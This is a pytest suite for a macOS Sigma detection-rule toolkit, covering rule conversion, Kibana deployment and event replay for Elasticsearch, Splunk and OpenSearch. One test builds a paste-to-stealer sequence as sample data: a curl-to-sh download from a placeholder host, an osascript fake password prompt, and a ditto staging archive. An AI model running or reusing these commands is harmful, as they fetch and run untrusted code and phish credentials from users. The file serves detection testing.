"""Replay tool (scripts/replay_capture.py) and deploy script (scripts/deploy_sigma_rules.py).

The bench tests replay derived fixtures (tests/fixtures/derived/README.md) into a throwaway index under the
template's pattern, then run the query deploy would deploy for the rule.
"""
import contextlib
import json
import os
import re
import signal
import sys
import tempfile
import uuid
from pathlib import Path
from types import SimpleNamespace

import pytest
import requests
from sigma.collection import SigmaCollection

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
sys.path.insert(0, str(ROOT / "collectors"))
import deploy_sigma_rules as deploy  # noqa: E402
import outputs  # noqa: E402
import replay_capture  # noqa: E402
from tests.test_outputs import FakeServer  # noqa: E402

DERIVED = ROOT / "tests" / "fixtures" / "derived"


def rule(path):
    return SigmaCollection.load_ruleset([str(ROOT / path)]).rules[0]


def pairs(threat):
    """(tactic id, technique or sub-technique id) for each pairing in an Elastic `threat` list."""
    return {
        (entry["tactic"]["id"], sub["id"])
        for entry in threat
        for technique in entry["technique"]
        for sub in technique.get("subtechnique") or [technique]
    }


def test_mitre_pairs_valid():
    threat = deploy.get_mitre_mapping(rule("rules/esf/macos_gatekeeper_user_override.yml"))
    assert pairs(threat) == {("TA0112", "T1553.001"), ("TA0002", "T1204")}


def test_mitre_derived_only_and_merged():
    """A tactic tag no technique has adds nothing; sub-techniques sit under one entry of their parent."""
    sigma_rule = SigmaCollection.from_yaml("""
title: t
logsource: {product: macos, category: process_creation}
detection: {sel: {Image: /usr/bin/zip}, condition: sel}
tags: [attack.exfiltration, attack.t1560, attack.t1560.001, attack.t1560.002]
""").rules[0]
    assert deploy.get_mitre_mapping(sigma_rule) == [{
        "framework": "MITRE ATT&CK",
        "tactic": {"id": "TA0009", "name": "Collection", "reference": "https://attack.mitre.org/tactics/TA0009/"},
        "technique": [{
            "id": "T1560", "name": "Archive Collected Data", "reference": "https://attack.mitre.org/techniques/T1560/",
            "subtechnique": [
                {"id": "T1560.001", "name": "Archive via Utility",
                 "reference": "https://attack.mitre.org/techniques/T1560/001/"},
                {"id": "T1560.002", "name": "Archive via Library",
                 "reference": "https://attack.mitre.org/techniques/T1560/002/"},
            ],
        }],
    }]


@pytest.mark.parametrize("tag", ["attack.not-a-tactic", "attack.t9999"])
def test_unknown_tactic_raises(tag):
    sigma_rule = SigmaCollection.from_yaml(f"""
title: t
logsource: {{product: macos, category: process_creation}}
detection: {{sel: {{Image: /bin/sh}}, condition: sel}}
tags: [attack.execution, {tag}]
""").rules[0]
    with pytest.raises(ValueError):
        deploy.get_mitre_mapping(sigma_rule)


def test_enable_is_single_post(monkeypatch):
    calls = []

    def post(url, **kwargs):
        calls.append((url, kwargs["json"]))
        return SimpleNamespace(status_code=200, ok=True, json=lambda: {"attributes": {"summary": {"succeeded": 3}}})

    monkeypatch.setattr(deploy.requests, "post", post)
    monkeypatch.setattr(deploy.requests, "patch", None)
    assert deploy.enable_rules(["a", "b", "c"]) == 3
    assert calls == [(f"{deploy.KIBANA_URL}/api/detection_engine/rules/_bulk_action",
                      {"action": "enable", "ids": ["a", "b", "c"]})]


def test_enable_failure_shows_reply(monkeypatch, capsys):
    body = {"message": "Bulk edit partially failed", "attributes": {"summary": {"succeeded": 1, "failed": 1}}}
    monkeypatch.setattr(deploy.requests, "post", lambda url, **kw: SimpleNamespace(
        status_code=500, ok=False, text=json.dumps(body), json=lambda: body))
    assert deploy.enable_rules(["a", "b"]) == 1
    out = capsys.readouterr().out
    assert "HTTP 500" in out and "partially failed" in out


def test_update_keeps_enabled(monkeypatch):
    sent = []
    monkeypatch.setattr(deploy.requests, "get", lambda url, **kw: SimpleNamespace(
        status_code=200, json=lambda: {"id": "kibana-id", "enabled": True}))
    monkeypatch.setattr(deploy.requests, "put", lambda url, **kw: sent.append(kw["json"]) or SimpleNamespace(
        status_code=200, json=lambda: {"id": "kibana-id"}))
    ok, _ = deploy.deploy_rule({"rule_id": "coresigma-x", "enabled": False, "name": "x"})
    assert ok and sent[0]["enabled"] is True and sent[0]["id"] == "kibana-id"


def _kibana(monkeypatch, create_status, import_ok=True):
    """Fake Kibana for deploy_rule: a 1.x Lucene query rule exists; records the calls."""
    calls = []
    monkeypatch.setattr(deploy.requests, "get", lambda url, **kw: SimpleNamespace(
        status_code=200, json=lambda: {"id": "old-id", "type": "query", "enabled": True}))
    monkeypatch.setattr(deploy.requests, "delete", lambda url, **kw: calls.append(("delete", url)) or SimpleNamespace(
        status_code=200))
    monkeypatch.setattr(deploy.requests, "put", lambda *a, **kw: pytest.fail("PUT can't change a rule's type"))

    def post(url, **kw):
        if "_export" in url:
            calls.append(("export", kw["json"]))
            return SimpleNamespace(status_code=200, content=b'{"rule_id": "coresigma-x", "type": "query"}\n')
        if "_import" in url:
            calls.append(("import", kw["files"]["file"][1]))
            return SimpleNamespace(status_code=200 if import_ok else 500, json=lambda: {"success": import_ok})
        calls.append(("create", kw["json"]))
        return SimpleNamespace(status_code=create_status, text="bad query", json=lambda: {"id": "new-id"})
    monkeypatch.setattr(deploy.requests, "post", post)
    return calls


def test_type_change_replaces_rule(monkeypatch):
    """A 1.x Lucene query rule with the same rule_id is exported, deleted and recreated as EQL, keeping enabled."""
    calls = _kibana(monkeypatch, 200)
    ok, message = deploy.deploy_rule({"rule_id": "coresigma-x", "type": "eql", "enabled": False, "name": "x"})
    assert ok and "replaced" in message
    assert [c[0] for c in calls] == ["export", "delete", "create"]
    assert calls[0][1] == {"objects": [{"rule_id": "coresigma-x"}]}
    assert calls[1][1] == f"{deploy.KIBANA_URL}/api/detection_engine/rules?id=old-id"
    assert calls[2][1]["enabled"] is True and calls[2][1]["rule_id"] == "coresigma-x"


def test_type_change_restores_old_rule_when_create_fails(monkeypatch, tmp_path):
    """A rejected create re-imports the exported old rule; if that fails too, the export is kept on disk."""
    calls = _kibana(monkeypatch, 400)
    ok, message = deploy.deploy_rule({"rule_id": "coresigma-x", "type": "eql", "name": "x"})
    assert not ok and "old one restored" in message
    assert [c[0] for c in calls] == ["export", "delete", "create", "import"]
    assert calls[3][1].startswith(b'{"rule_id": "coresigma-x"')

    monkeypatch.setattr(deploy.tempfile, "gettempdir", lambda: str(tmp_path))
    _kibana(monkeypatch, 400, import_ok=False)
    ok, message = deploy.deploy_rule({"rule_id": "coresigma-x", "type": "eql", "name": "x"})
    assert not ok and "couldn't be restored" in message
    assert (tmp_path / "coresigma-x.ndjson").read_bytes().startswith(b'{"rule_id"')


def test_fix_eql():
    """Numbers compare with == / in; regex~'s \\/ (Lucene's escape, rejected by EQL) becomes /, an escaped \\ stays."""
    query = r'any where signal.number like~ (9, 15) and memory.protection:7 and file.path regex~ ".*\/a\\/b"'
    assert deploy.fix_eql(query) == r'any where signal.number in (9, 15) and memory.protection == 7 and file.path regex~ ".*/a\\/b"'
    assert deploy.fix_eql("btm.item.type:4 and btm.item.type like~ (3, 4)") == "btm.item.type == 4 and btm.item.type in (3, 4)"
    assert "btm.item.type in (3, 4)" in deployed("rules/esf/macos_btm_launch_item_added.yml")  # long, as in the templates


def test_fix_eql_regex_escapes():
    """A regex backslash that begins no EQL string escape is doubled (EQL rejects \\.); \\/ still becomes /."""
    assert deployed("rules/esf/macos_esf_rename_to_hidden_dotfile.yml") == (
        r'any where (event.category:"file" and event.action:"rename") and (file.path regex~ ".*/\\.[^/]+$" and '
        r'(not file.Ext.original.path regex~ ".*/\\.[^/]+$"))')
    assert deploy.fix_eql(r'a regex~ "\d+\s\\x\"\n"') == r'a regex~ "\\d+\\s\\x\"\n"'


def stanzas(conf):
    """{stanza name: {key: value}} of a .conf file."""
    result, current = {}, None
    for line in conf.splitlines():
        if m := re.fullmatch(r"\[(.+)\]", line):
            current = result[m.group(1)] = {}
        elif " = " in line:
            key, value = line.split(" = ", 1)
            current[key] = value
    return result


def test_splunk_savedsearches_written(tmp_path):
    collection = SigmaCollection.load_ruleset([str(ROOT / "rules")])
    deploy.write_splunk_app(deploy.convert_rules("splunk", collection), tmp_path)
    written = stanzas((tmp_path / "default" / "savedsearches.conf").read_text())
    coresigma = lambda r: r.custom_attributes.get("custom", {}).get("coresigma", {})  # noqa: E731
    expected = {
        f"coreSigma: {r.title}" for r in SigmaCollection.load_ruleset([str(ROOT / "rules")]).rules
        if coresigma(r).get("status") != "fails"
        and coresigma(r).get("splunk") != "unsupported"
        and r._output  # False for a correlation's base rule (generate: false): no stanza of its own
    }
    # every correlation type Splunk can't convert (temporal_ordered) declares a fallback, so none is missing
    assert expected and expected == set(written)
    for stanza in written.values():
        assert stanza["search"].startswith(("index=macos ", "| multisearch [ search index=macos "))
        assert "\n" not in stanza["search"]
        assert stanza["cron_schedule"] == "*/5 * * * *" and stanza["disabled"] == "1"
    view = (tmp_path / "default" / "data" / "ui" / "views" / "coresigma_overview.xml").read_text()
    assert "event.action" in view and "process.executable" in view and "Rule hits" in view


def test_splunk_fallback_stanza(tmp_path):
    """paste_to_stealer (temporal_ordered) gets Splunk's temporal form, marked; the rule itself stays ordered."""
    collection = SigmaCollection.load_ruleset([str(ROOT / "rules")])
    results = deploy.convert_rules("splunk", collection)
    deploy.write_splunk_app(results, tmp_path)
    conf = (tmp_path / "default" / "savedsearches.conf").read_text()
    stanza = conf.split("[coreSigma: Paste-to-Stealer Chain]\n")
    assert "# fallback: converted as temporal (custom.coresigma.splunk), not temporal_ordered" in stanza[0].splitlines()[-1]
    search = stanzas(conf)["coreSigma: Paste-to-Stealer Chain"]["search"]
    assert search.startswith("| multisearch [ search index=macos ") and search.count("[ search index=macos ") == 3
    assert "stats dc(event_type) as event_type_count by _time host.name user.name" in search
    assert search.endswith("| search event_type_count >= 3")
    [rule] = [r for r in collection.rules if r.title == "Paste-to-Stealer Chain"]
    assert rule.type.name == "TEMPORAL_ORDERED"


def test_correlation_without_fallback_skipped():
    """A correlation type the backend can't convert, with no fallback declared, is skipped with the reason."""
    collection = SigmaCollection.from_yaml("""
title: a
name: rule_a
logsource: {product: macos, category: process_creation}
detection: {sel: {Image|endswith: /curl}, condition: sel}
---
title: b
name: rule_b
logsource: {product: macos, category: file_event}
detection: {sel: {TargetFilename|contains: /LaunchAgents/}, condition: sel}
---
title: chain
correlation: {type: temporal_ordered, rules: [rule_a, rule_b], group-by: [host.name], timespan: 15m}
""")
    results = {rule.title: (query, note) for rule, query, note in deploy.convert_rules("splunk", collection)}
    assert results["chain"][0] is None and "temporal_ordered" in results["chain"][1]


def test_elastic_correlations_deploy():
    """Kibana gets every rule: each temporal_ordered correlation as an EQL sequence rule, each other correlation as an
    ES|QL rule on its base rules' indices that alerts on each closed window once; a correlation looks back its
    timespan plus a rule's 6 minutes."""
    results = deploy.convert_rules("elastic", SigmaCollection.load_ruleset([str(ROOT / "rules")]))
    assert all(query for _, query, _ in results), [(r.title, note) for r, query, note in results if not query]
    payloads = {Path(r.source.path).stem: (r, deploy.create_detection_rule(r, q)) for r, q, _ in results
                if isinstance(r, deploy.SigmaCorrelationRule)}
    assert len(payloads) == len(list((ROOT / "rules" / "correlation").glob("*.yml")))
    for stem, (corr, payload) in payloads.items():
        ordered = corr.type.name == "TEMPORAL_ORDERED"
        assert payload["type"] == payload["language"] == ("eql" if ordered else "esql"), stem
        assert payload["from"] == f"now-{corr.timespan.seconds + 360}s" and payload["interval"] == "5m"
        assert payload["enabled"] is False and "correlation" in payload["tags"]
        if ordered:
            assert payload["query"].startswith(f"sequence by host.name, user.name with maxspan={corr.timespan.seconds}s ")
            assert payload["index"] == [deploy.ES_INDEX_ESF]
        else:
            assert "index" not in payload and "from * " not in payload["query"]
            ts = corr.timespan.seconds
            assert payload["query"].endswith(f"\n| where timebucket > now() - {ts + 360} seconds"
                                             f" and timebucket <= now() - {ts + 60} seconds"), stem
    esql = payloads["hidden_prompt_keychain_activity"][1]
    assert esql["query"].startswith(f"from {deploy.ES_INDEX_ESF},{deploy.ES_INDEX_UL} metadata ")
    assert {"esf", "unified-logging"} <= set(esql["tags"])
    dns = payloads["dns_resolution_failure_spike"][1]
    assert dns["rule_id"] == "coresigma-ul-dns_resolution_failure_spike" and "esf" not in dns["tags"]
    assert dns["query"].startswith(f"from {deploy.ES_INDEX_UL} metadata ")
    assert "Ad-hoc Code Signing with codesign" not in {r.title for r, _, _ in results}  # a base rule: no rule of its own


def test_closed_windows_follow_the_interval(monkeypatch):
    """Consecutive runs INTERVAL apart take adjoining, non-overlapping bands of windows: each window alerts once."""
    def band(timespan):
        lower, upper = (int(n) for n in re.findall(r"now\(\) - (\d+) seconds", deploy.closed_windows(timespan)))
        return lower - upper  # the band's width, in seconds
    assert band(60) == band(1800) == deploy.INTERVAL == 300
    monkeypatch.setattr(deploy, "INTERVAL", 60)
    assert band(60) == 60 and deploy.closed_windows(60) == ("\n| where timebucket > now() - 180 seconds"
                                                              " and timebucket <= now() - 120 seconds")


def test_changelog_stale_rules_are_not_deployed():
    """The rule IDs the changelog tells upgraders to delete are none that 2.0 deploys."""
    [line] = [l for l in (ROOT / "CHANGELOG.md").read_text().splitlines() if l.startswith("- **Stale Kibana rules.**")]
    stale = set(re.findall(r"`(coresigma-[\w-]+)`", line))
    deployed = {deploy.create_detection_rule(r, q)["rule_id"]
                for r, q, _ in deploy.convert_rules("elastic", SigmaCollection.load_ruleset([str(ROOT / "rules")])) if q}
    assert len(stale) == 4 and len(deployed) == 69 and not stale & deployed


TWO_RULES = """
title: a
name: rule_a
logsource: {product: macos, category: process_signal}
detection: {sel: {SignalNumber: 15}, condition: sel}
---
title: b
name: rule_b
logsource: {product: macos, category: file_event}
detection: {sel: {TargetFilename|contains: /LaunchAgents/}, condition: sel}
---
title: chain
"""


def test_sequence_steps_get_the_eql_fix():
    """fix_eql reaches a sequence's steps: a numeric field compares with ==."""
    [(_, query, _)] = deploy.convert_rules("elastic", SigmaCollection.from_yaml(
        TWO_RULES + "correlation: {type: temporal_ordered, rules: [rule_a, rule_b], group-by: [host.name], timespan: 1m}"))
    assert query.startswith("sequence by host.name with maxspan=60s [any where ") and "signal.number == 15" in query
    assert "signal.number:15" not in query


def test_correlation_neither_converts_keeps_both_reasons():
    """A correlation EQL and ES|QL both refuse keeps both reasons: the EQL one isn't lost in the ES|QL merge."""
    [(rule, query, note)] = deploy.convert_rules("elastic", SigmaCollection.from_yaml(
        TWO_RULES + "correlation: {type: temporal_ordered, rules: [rule_a, rule_b], group-by: [host.name], timespan: 1m,"
                    " condition: {gte: 1}}"))
    assert rule.title == "chain" and query is None
    assert note == ("EQL: EQL sequence: only a condition that needs every rule (the default) converts; "
                    "ES|QL: Correlation type 'temporal_ordered' is not supported by backend.")


def test_esql_converts_only_correlations(monkeypatch):
    """ES|QL converts only the correlations and their base rules: an ES|QL failure on any other rule can't stop the
    deploy, and that rule still gets its EQL query."""
    convert_rule = deploy.ESQLBackend.convert_rule

    def only_base_rules(backend, rule, *args, **kwargs):
        if rule.title == "alone":
            raise RuntimeError("ES|QL saw a rule that isn't a base rule")
        return convert_rule(backend, rule, *args, **kwargs)
    monkeypatch.setattr(deploy.ESQLBackend, "convert_rule", only_base_rules)
    results = deploy.convert_rules("elastic", SigmaCollection.from_yaml(
        TWO_RULES.replace("title: chain\n", "") + """title: alone
logsource: {product: macos, category: process_creation}
detection: {sel: {Image|endswith: /curl}, condition: sel}
---
title: burst
correlation: {type: event_count, rules: [rule_a], group-by: [host.name], timespan: 1m, condition: {gt: 3}}
"""))
    queries = {rule.title: query for rule, query, _ in results}
    assert queries["alone"].startswith("any where ") and queries["burst"].startswith("from * metadata ")


def test_splunk_search_scoped():
    """index=macos goes in front of a search, or into each subsearch of a multi-rule correlation's | multisearch."""
    assert deploy.splunk_search('a="1"\n\n| stats count') == 'index=macos a="1"  | stats count'
    assert deploy.splunk_search('| multisearch\n[ search a="1" | eval t="x" ]\n[ search b="2" | eval t="y" ]\n| stats count') \
        == '| multisearch [ search index=macos a="1" | eval t="x" ] [ search index=macos b="2" | eval t="y" ] | stats count'


def test_replay_keeps_timestamps_and_window():
    """Each source's documents go to its own sender, @timestamp unchanged; --window bounds them."""
    sent = {}

    class Sender:
        def __init__(self, source):
            self.docs = sent.setdefault(source, [])

        def send(self, doc):
            self.docs.append(doc)

        def close(self):
            pass

    files = [DERIVED / "exec_long_commandline.ndjson", DERIVED / "alf_firewall_disabled.ndjson"]
    counts = replay_capture.replay(files, Sender)
    assert counts == {"esf": 1, "ul": 1}
    assert sent["esf"][0]["@timestamp"] == "2026-11-10T20:31:55.294251126Z"
    assert sent["esf"][0]["process.command_line"].endswith("https://example.com/install.sh")
    assert sent["ul"][0]["@timestamp"] == "2026-11-10T21:16:13.710158+00:00"

    sent.clear()
    window = replay_capture.parse_window("2026-11-10T21:00:00Z", "2026-11-10T22:00:00Z")
    assert replay_capture.replay(files, Sender, window) == {"ul": 1}


def test_replay_skips_what_collectors_drop(tmp_path):
    """UL lines outside the collector's `log stream` predicate, and ESF events it doesn't subscribe to, aren't sent."""
    capture = tmp_path / "mixed.json"
    ul = json.loads((DERIVED / "alf_firewall_disabled.ndjson").read_text())
    esf = json.loads((DERIVED / "exec_long_commandline.ndjson").read_text())
    capture.write_text("\n".join(json.dumps(x) for x in [
        {**ul, "subsystem": "com.apple.Hearing"},
        {**esf, "event": {"uipc_connect": {}}},
        ul, "not json",
    ]) + "\n")
    assert replay_capture.replay([capture], lambda source: SimpleNamespace(send=lambda d: None, close=lambda: None)) \
        == {"ul": 1}


@pytest.mark.parametrize("target,replies,undelivered", [
    ("opensearch", [(401, {"error": "unauthorized"})] * 2, 2),
    ("opensearch", [(200, {"errors": True, "items": [{"create": {"status": 400, "error": {"type": "mapper"}}}]})], 1),
    ("clickhouse", [(400, {"exception": "Cannot parse input"})] * 2, 2),
    ("opensearch", [], 0),
])
def test_replay_fails_unless_delivered(tmp_path, monkeypatch, capsys, target, replies, undelivered):
    """Documents a target refuses fail the replay (exit 1), spooled to this run's directory, not the collectors'."""
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    server = FakeServer(replies)
    files = [str(DERIVED / "exec_long_commandline.ndjson"), str(DERIVED / "alf_firewall_disabled.ndjson")]
    try:
        if undelivered:
            with pytest.raises(SystemExit) as exit:
                replay_capture.main(files + ["--target", target, "--url", server.url])
            assert f"FAILED: {undelivered} of 2 documents not delivered" in str(exit.value.code)
            [spool] = tmp_path.glob("coresigma-replay-spool-*")
            assert sum(len(f.read_text().splitlines()) for f in spool.iterdir()) == undelivered
        else:
            replay_capture.main(files + ["--target", target, "--url", server.url])
            assert "1 ESF, 1 UL documents" in capsys.readouterr().out
            assert not list(tmp_path.glob("coresigma-replay-spool-*"))
    finally:
        server.httpd.shutdown()
    assert outputs.SPOOL_DIR is None  # the collectors' spool again


def test_replay_deterministic_no_signal_handlers(tmp_path):
    """The fork sampling gives the same documents on every replay; replaying installs no signal handlers."""
    fork = json.loads((ROOT / "tests" / "fixtures" / "esf" / "fork.json").read_text().splitlines()[0])
    fork["process"]["executable"]["path"] = "/usr/libexec/sampled"  # not a security process: sampled at 10%
    capture = tmp_path / "forks.json"
    capture.write_text("".join(json.dumps({**fork, "time": f"2026-11-10T20:00:{i:02d}.000000000Z"}) + "\n"
                               for i in range(60)))
    handlers = {s: signal.getsignal(s) for s in (signal.SIGINT, signal.SIGTERM)}
    runs = [[doc["@timestamp"] for _, doc in replay_capture.documents([capture])] for _ in range(2)]
    assert runs[0] == runs[1] and 0 < len(runs[0]) < 60
    assert {s: signal.getsignal(s) for s in handlers} == handlers


# --- bench: scripts/bench_up.sh elastic ------------------------------------------------------------

def bench_setting(name, default):
    """The environment's value, else the one bench_up.sh wrote to .env, else default."""
    env = ROOT / ".env"
    lines = env.read_text().splitlines() if env.exists() else []
    found = [line.split("=", 1)[1] for line in lines if line.startswith(name + "=")]
    return os.environ.get(name) or (found[0] if found else default)


ES_URL = bench_setting("ES_URL", "http://localhost:9200")
ES_AUTH = ("elastic", bench_setting("ELASTIC_PASSWORD", "changeme"))


OS_URL = bench_setting("OS_URL", "http://localhost:9201")  # bench_up.sh opensearch: no auth


@contextlib.contextmanager
def replayed(*files, url=ES_URL, auth=ES_AUTH):
    """Fresh indices under the templates' patterns holding the replayed files: {source: index pattern}."""
    run = uuid.uuid4().hex[:8]
    patterns = {source: f"{prefix}-pytest-{run}-*" for source, prefix in outputs.INDEX_PREFIX.items()}
    try:
        replay_capture.replay(files, lambda source: outputs.BulkSender(url, auth, patterns[source][:-2]))
        requests.post(f"{url}/{','.join(patterns.values())}/_refresh", auth=auth).raise_for_status()
        yield patterns
    finally:
        for index in requests.get(f"{url}/{','.join(patterns.values())}", auth=auth).json():
            requests.delete(f"{url}/{index}", auth=auth)


def eql(index, query):
    """The events an EQL query finds, or AssertionError with Elasticsearch's reason."""
    reply = requests.post(f"{ES_URL}/{index}/_eql/search", auth=ES_AUTH, json={"query": query})
    assert reply.status_code == 200, reply.text
    return [event["_source"] for event in reply.json()["hits"].get("events", [])]


def deployed(rule_path):
    """The EQL query deploy_sigma_rules.py deploys for a rule."""
    [(_, query, error)] = deploy.convert_rules("elastic", SigmaCollection.load_ruleset([str(ROOT / rule_path)]))
    assert error is None
    return query


@pytest.mark.bench
def test_long_commandline_matches():
    with replayed(DERIVED / "exec_long_commandline.ndjson") as index:
        found = eql(index["esf"], deployed("rules/esf/macos_http_tools_with_protocol_indicators.yml"))
    assert len(found) == 1
    assert len(found[0]["process.command_line"]) >= 400
    assert found[0]["@timestamp"] == "2026-11-10T20:31:55.294251126Z"


@pytest.mark.bench
def test_multiword_message_matches():
    with replayed(DERIVED / "alf_firewall_disabled.ndjson") as index:
        found = eql(index["ul"], deployed("rules/ul/firewall_disabled.yml"))
    assert len(found) == 1 and "Firewall disabled" in found[0]["message"]


@pytest.mark.bench
def test_sequence_enforces_order():
    """The deployed Paste-to-Stealer sequence matches its three steps in order and not out of order: one host runs
    them reversed, another in order, in an index of this test's own (the only one it deletes)."""
    [query] = [q for r, q, _ in deploy.convert_rules("elastic", SigmaCollection.load_ruleset([str(ROOT / "rules")]))
               if r.title == "Paste-to-Stealer Chain"]
    steps = [("/bin/zsh", "/bin/zsh -c curl -s https://example.invalid/a | sh"),
             ("/usr/bin/osascript", 'osascript -e display dialog "Password:" default answer "" with hidden answer'),
             ("/usr/bin/ditto", "ditto -c -k /Users/u/collect /tmp/stage.zip")]
    index = f"{outputs.INDEX_PREFIX['esf']}-pytest-{uuid.uuid4().hex[:8]}"
    bulk = ""
    for host, order in (("reversed", steps[::-1]), ("ordered", steps)):
        for second, (executable, command_line) in enumerate(order):
            bulk += json.dumps({"create": {}}) + "\n" + json.dumps({
                "@timestamp": f"2026-01-15T10:00:0{second}Z", "host.name": host, "user.name": "u",
                "event.category": "process", "event.type": "start", "event.action": "exec",
                "process.executable": executable, "process.command_line": command_line,
                "process.parent.executable": "/bin/zsh"}) + "\n"
    try:
        reply = requests.post(f"{ES_URL}/{index}/_bulk?refresh=true", auth=ES_AUTH, data=bulk,
                              headers={"Content-Type": "application/x-ndjson"})
        assert reply.ok and not reply.json()["errors"], reply.text[:500]
        reply = requests.post(f"{ES_URL}/{index}/_eql/search", auth=ES_AUTH, json={"query": query})
        assert reply.status_code == 200, reply.text
        sequences = reply.json()["hits"]["sequences"]
        assert [s["join_keys"] for s in sequences] == [["ordered", "u"]]
        assert [e["_source"]["process.executable"] for e in sequences[0]["events"]] == [x for x, _ in steps]
    finally:
        requests.delete(f"{ES_URL}/{index}", auth=ES_AUTH)


@pytest.mark.bench
def test_every_deployed_query_runs(monkeypatch):
    """Elasticsearch accepts every deployed EQL and ES|QL query, on the indices deploy gives it, also on fields no
    replayed document has."""
    fixtures = sorted((ROOT / "tests" / "fixtures").glob("esf/*.json")) + sorted((ROOT / "tests" / "fixtures").glob("ul/*.ndjson"))
    failures = []
    with replayed(*fixtures) as index:
        monkeypatch.setattr(deploy, "ES_INDEX_ESF", index["esf"])
        monkeypatch.setattr(deploy, "ES_INDEX_UL", index["ul"])
        for rule, query, _ in deploy.convert_rules("elastic", SigmaCollection.load_ruleset([str(ROOT / "rules")])):
            if query:
                payload = deploy.create_detection_rule(rule, query)
                reply = requests.post(f"{ES_URL}/_query", auth=ES_AUTH, json={"query": payload["query"]}) \
                    if payload["type"] == "esql" else requests.post(f"{ES_URL}/{','.join(payload['index'])}/_eql/search",
                                                                    auth=ES_AUTH, json={"query": query, "size": 1})
                if reply.status_code != 200:
                    failures.append(f"{rule.title}: {reply.json()['error']['root_cause'][0]['reason']}")
    assert not failures, "\n".join(failures)


@pytest.mark.bench
@pytest.mark.parametrize("fixture,source,rule_path", [
    # Image|endswith /curl, CommandLine|contains https:// at character 382
    ("exec_long_commandline.ndjson", "esf", "rules/esf/macos_http_tools_with_protocol_indicators.yml"),
    # message|contains "firewall disabled" on "Application Firewall disabled ..."
    ("alf_firewall_disabled.ndjson", "ul", "rules/ul/firewall_disabled.yml"),
])
def test_opensearch_contains_endswith_match(fixture, source, rule_path):
    """The OpenSearch Lucene query (leading wildcards) matches on the OpenSearch template, case-insensitively."""
    from sigma.backends.opensearch import OpensearchLuceneBackend
    from sigma.pipelines.macos import macos_esf_ecs, macos_ul_ecs
    [query] = OpensearchLuceneBackend(macos_esf_ecs() + macos_ul_ecs()).convert(
        SigmaCollection.load_ruleset([str(ROOT / rule_path)]))
    with replayed(DERIVED / fixture, url=OS_URL, auth=None) as index:
        reply = requests.post(f"{OS_URL}/{index[source]}/_search", json={"query": {"query_string": {"query": query}}})
    assert reply.status_code == 200, reply.text
    assert reply.json()["hits"]["total"]["value"] == 1


def test_replay_fails_when_a_clickhouse_insert_is_lost(tmp_path, monkeypatch):
    """A failed INSERT whose spool write fails too leaves no file to count: ClickHouseSender's unsent['lost'] fails it."""
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    monkeypatch.setattr(outputs._Sender, "_spool", lambda self, failed, rejected=False, keep_partial=True: None)
    server = FakeServer([(400, {"exception": "Cannot parse input"})] * 2)
    try:
        with pytest.raises(SystemExit) as exit:
            replay_capture.main([str(DERIVED / "exec_long_commandline.ndjson"), "--target", "clickhouse",
                                 "--url", server.url])
    finally:
        server.httpd.shutdown()
    assert "1 of 1 documents not delivered and not spooled" in str(exit.value.code)
    assert outputs.SPOOL_DIR is None


def test_replay_fails_when_documents_are_lost(tmp_path, monkeypatch):
    """A sender that couldn't even write its spool file (unsent['lost']) fails the replay: nothing is on disk to count."""
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    lost = SimpleNamespace(send=lambda d: None, close=lambda: None, unsent={"lost": 1})
    with pytest.raises(replay_capture.ReplayError, match="1 of 1 documents not delivered and not spooled"):
        replay_capture.replay([DERIVED / "exec_long_commandline.ndjson"], lambda source: lost)
    assert outputs.SPOOL_DIR is None
